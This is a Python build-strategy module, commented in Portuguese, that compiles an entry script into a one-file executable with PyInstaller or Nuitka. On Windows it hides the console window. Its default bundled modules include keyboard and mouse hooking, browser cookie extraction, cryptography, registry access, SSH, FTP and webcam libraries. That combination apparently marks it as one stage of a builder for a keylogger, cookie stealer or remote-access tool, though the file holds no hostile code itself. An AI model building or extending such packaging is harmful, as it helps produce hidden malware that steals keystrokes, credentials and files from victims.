# strategies/compilation.py

import os
import sys
import subprocess
from pathlib import Path
from .base import BuildContext, CompilationStrategy
from rich.console import Console

console = Console()


class PyInstallerCompilation(CompilationStrategy):

    def execute(self, context: BuildContext) -> BuildContext:
        command = [
            'pyinstaller', '--clean', '--onefile',
            f'--distpath={context.build_dir / "dist"}',
            f'--workpath={context.build_dir / "build"}',
            f'--name={context.config["output"]}'
        ]

        if context.config['platform'] == 'windows':
            command.append('--noconsole')

        hidden_imports = context.config.get('hidden_imports', [
            'requests', 'psutil', 'pynput',
            'pynput.keyboard._win32', 'pynput.mouse._win32',
            'browser_cookie3', 'Cryptodome', 'PIL', 'numpy',
            'win32', 'sqlite3', 'paramiko', 'ftplib',
            'threading', 'six'
        ])
        for module in hidden_imports:
            command.append(f'--hidden-import={module}')

        # cv2 só adicionado se disponível — import movido para dentro do try
        try:
            import cv2
            cv2_path = os.path.dirname(cv2.__file__)
            command.append(f'--add-binary={cv2_path}{os.pathsep}cv2')
            command.extend(['--collect-all', 'numpy'])
            command.append('--hidden-import=cv2')
        except ImportError:
            console.print("[bold yellow]  → AVISO: OpenCV não encontrado. Continuando sem cv2.[/bold yellow]")

        extra_args = context.config.get('extra_args', [])
        command.extend(extra_args)
        command.append(str(context.entry_script_path))

        console.print("[bold cyan]  → Executando PyInstaller (output em tempo real)...[/bold cyan]")

        # Popen para streaming de output — não trava o terminal
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            for line in process.stdout:
                stripped = line.strip()
                if stripped:
                    console.print(f"  [dim]{stripped}[/dim]")
            return_code = process.wait()
        except FileNotFoundError:
            raise RuntimeError(
                "PyInstaller não encontrado. Execute: pip install pyinstaller"
            )

        if return_code != 0:
            raise RuntimeError(f"PyInstaller falhou com código: {return_code}")

        # Localiza o artefato gerado — considera extensão automática (.exe no Windows)
        context.final_artifact_path = self._find_artifact(
            context.build_dir / "dist", context.config["output"]
        )
        context.log(f"PyInstallerCompilation: artefato em {context.final_artifact_path}")
        return context

    @staticmethod
    def _find_artifact(dist_dir: Path, name: str) -> Path:
        """Localiza o artefato gerado, tolerando extensões automáticas."""
        direct = dist_dir / name
        if direct.exists():
            return direct
        # Tenta com extensão .exe (Windows)
        exe = dist_dir / f"{name}.exe"
        if exe.exists():
            return exe
        # Fallback: pega o primeiro arquivo na pasta dist
        candidates = list(dist_dir.glob("*"))
        if candidates:
            return candidates[0]
        raise FileNotFoundError(
            f"Artefato não encontrado em {dist_dir}. "
            f"Verifique os logs do PyInstaller acima."
        )


class NuitkaCompilation(CompilationStrategy):

    def execute(self, context: BuildContext) -> BuildContext:
        command = [
            sys.executable, '-m', 'nuitka',
            '--onefile',
            '--remove-output',
            '--show-progress',
            f'--output-dir={context.build_dir / "dist"}',
            f'--output-filename={context.config["output"]}'
        ]

        if context.config['platform'] == 'windows':
            command.append('--windows-disable-console')

        modules_to_include = context.config.get('hidden_imports', [
            'requests', 'psutil', 'pynput', 'browser_cookie3',
            'Cryptodome', 'PIL', 'numpy', 'win32', 'win32gui',
            'sqlite3', 'http.server', 'winreg', 'threading'
        ])
        for module in modules_to_include:
            command.append(f'--include-module={module}')

        extra_args = context.config.get('extra_args', [])
        command.extend(extra_args)
        command.append(str(context.entry_script_path))

        console.print("[bold cyan]  → Executando Nuitka (output em tempo real)...[/bold cyan]")

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            for line in process.stdout:
                stripped = line.strip()
                if stripped:
                    console.print(f"  [dim]{stripped}[/dim]")
            return_code = process.wait()
        except FileNotFoundError:
            raise RuntimeError(
                "Nuitka não encontrado. Execute: pip install nuitka"
            )
        except Exception as e:
            raise RuntimeError(f"Falha ao executar o Nuitka: {e}")

        if return_code != 0:
            raise RuntimeError(f"Nuitka falhou com código: {return_code}")

        context.final_artifact_path = self._find_artifact(
            context.build_dir / "dist", context.config["output"]
        )
        context.log(f"NuitkaCompilation: artefato em {context.final_artifact_path}")
        return context

    @staticmethod
    def _find_artifact(dist_dir: Path, name: str) -> Path:
        direct = dist_dir / name
        if direct.exists():
            return direct
        exe = dist_dir / f"{name}.exe"
        if exe.exists():
            return exe
        # Nuitka pode gerar .bin no Linux
        bin_file = dist_dir / f"{name}.bin"
        if bin_file.exists():
            return bin_file
        candidates = list(dist_dir.glob("*"))
        if candidates:
            return candidates[0]
        raise FileNotFoundError(
            f"Artefato Nuitka não encontrado em {dist_dir}."
        )


class ScriptOutput(CompilationStrategy):

    def execute(self, context: BuildContext) -> BuildContext:
        context.final_artifact_path = context.entry_script_path
        context.log("ScriptOutput: script final sem compilação.")
        console.print("[bold cyan]  → Saída como script .py (sem compilação).[/bold cyan]")
        return context
